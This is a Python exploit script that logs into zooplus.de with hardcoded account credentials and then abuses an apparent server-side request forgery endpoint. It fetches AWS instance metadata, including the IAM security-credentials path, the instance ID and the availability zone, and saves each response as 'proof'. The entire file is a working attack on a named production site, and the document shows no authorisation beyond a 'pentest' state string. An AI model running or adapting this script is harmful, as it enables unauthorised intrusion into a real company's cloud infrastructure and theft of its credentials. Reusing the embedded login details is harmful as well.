#!/usr/bin/env python3
"""100% PROOF: SSRF to AWS Metadata Service"""
import requests
import json
import re
import urllib.parse
from datetime import datetime
import urllib3
urllib3.disable_warnings()

base = "https://www.zooplus.de"
s = requests.Session()
s.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "*/*",
})

# LOGIN
print("[*] Logging in...")
ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"

try:
    params = {"response_type": "code", "client_id": "shop-myzooplus-prod-zooplus", "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login", "state": "pentest", "login": "true", "ui_locales": "de-DE", "scope": "openid"}
    r1 = s.get(AUTH_URL, params=params, timeout=10, verify=False)
    m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
    if m:
        action = m.group(1).replace("&amp;", "&")
        if not action.startswith("http"):
            action = urllib.parse.urljoin(r1.url, action)
        r2 = s.post(action, data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""}, timeout=10, verify=False, allow_redirects=False)
        loc = r2.headers.get("Location", "")
        if loc:
            s.get(loc, timeout=10, verify=False, allow_redirects=True)
            s.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
            s.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
            print("[+] Logged in\n")
except Exception as e:
    print(f"[!] Login: {e}\n")

ssrf_endpoint = "/zootopia-events/api/events/sites/1"

print("="*70)
print("100% PROOF: SSRF to AWS Metadata Service")
print("="*70)

# Test 1: Get IAM Role Name
print("\n[1] Testing: AWS Metadata IAM Role Name...")
print("    URL: http://169.254.169.254/latest/meta-data/iam/security-credentials/")

try:
    resp = s.post(f"{base}{ssrf_endpoint}", json={
        "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
    }, timeout=10, verify=False)
    
    print(f"    Status: {resp.status_code}")
    print(f"    Response: {repr(resp.text)}")
    print(f"    Response length: {len(resp.text)}")
    
    if resp.status_code == 200:
        response_text = resp.text.strip()
        
        # Check if we got IAM role name
        if response_text and response_text != "{}" and len(response_text) > 0:
            if not response_text.startswith("<!DOCTYPE") and not response_text.startswith("<html"):
                print(f"\n{'='*70}")
                print(f"🔥 100% PROOF - SSRF CONFIRMED!")
                print(f"{'='*70}")
                print(f"AWS IAM ROLE NAME: {response_text}")
                print(f"{'='*70}\n")
                
                # Save proof
                proof = {
                    "timestamp": datetime.now().isoformat(),
                    "vulnerable_endpoint": f"{base}{ssrf_endpoint}",
                    "aws_metadata_url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                    "status_code": resp.status_code,
                    "iam_role_name": response_text,
                    "headers": dict(resp.headers),
                    "proof_type": "AWS_METADATA_IAM_ROLE"
                }
                
                with open(f"logs/aws_metadata_proof_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", "w") as f:
                    json.dump(proof, f, indent=2)
                
                print(f"[+] Proof saved to logs/")
            else:
                print(f"    [INFO] HTML response, trying instance-id...")
        else:
            print(f"    [INFO] Empty response, trying instance-id...")
            
            # Test 2: Get Instance ID
            print("\n[2] Testing: AWS Metadata Instance ID...")
            print("    URL: http://169.254.169.254/latest/meta-data/instance-id")
            
            resp2 = s.post(f"{base}{ssrf_endpoint}", json={
                "url": "http://169.254.169.254/latest/meta-data/instance-id"
            }, timeout=10, verify=False)
            
            print(f"    Status: {resp2.status_code}")
            print(f"    Response: {repr(resp2.text)}")
            
            if resp2.status_code == 200:
                instance_id = resp2.text.strip()
                if instance_id and instance_id.startswith("i-") and len(instance_id) > 5:
                    print(f"\n{'='*70}")
                    print(f"🔥 100% PROOF - SSRF CONFIRMED!")
                    print(f"{'='*70}")
                    print(f"AWS INSTANCE ID: {instance_id}")
                    print(f"{'='*70}\n")
                    
                    # Save proof
                    proof = {
                        "timestamp": datetime.now().isoformat(),
                        "vulnerable_endpoint": f"{base}{ssrf_endpoint}",
                        "aws_metadata_url": "http://169.254.169.254/latest/meta-data/instance-id",
                        "status_code": resp2.status_code,
                        "instance_id": instance_id,
                        "headers": dict(resp2.headers),
                        "proof_type": "AWS_METADATA_INSTANCE_ID"
                    }
                    
                    with open(f"logs/aws_metadata_proof_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", "w") as f:
                        json.dump(proof, f, indent=2)
                    
                    print(f"[+] Proof saved to logs/")
                else:
                    print(f"    [INFO] Response: {instance_id}")
                    
                    # Test 3: Try availability zone
                    print("\n[3] Testing: AWS Metadata Availability Zone...")
                    resp3 = s.post(f"{base}{ssrf_endpoint}", json={
                        "url": "http://169.254.169.254/latest/meta-data/placement/availability-zone"
                    }, timeout=10, verify=False)
                    
                    print(f"    Status: {resp3.status_code}")
                    print(f"    Response: {repr(resp3.text)}")
                    
                    if resp3.status_code == 200 and resp3.text and len(resp3.text.strip()) > 0:
                        az = resp3.text.strip()
                        if "us-" in az or "eu-" in az or "ap-" in az:
                            print(f"\n{'='*70}")
                            print(f"🔥 100% PROOF - SSRF CONFIRMED!")
                            print(f"{'='*70}")
                            print(f"AWS Availability Zone: {az}")
                            print(f"{'='*70}\n")
                            
                            proof = {
                                "timestamp": datetime.now().isoformat(),
                                "vulnerable_endpoint": f"{base}{ssrf_endpoint}",
                                "aws_metadata_url": "http://169.254.169.254/latest/meta-data/placement/availability-zone",
                                "status_code": resp3.status_code,
                                "availability_zone": az,
                                "headers": dict(resp3.headers),
                                "proof_type": "AWS_METADATA_AVAILABILITY_ZONE"
                            }
                            
                            with open(f"logs/aws_metadata_proof_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json", "w") as f:
                                json.dump(proof, f, indent=2)
                            
                            print(f"[+] Proof saved to logs/")
        
except Exception as e:
    print(f"[ERROR] {e}")
    import traceback
    traceback.print_exc()

print("\n" + "="*70)
print("Done!")





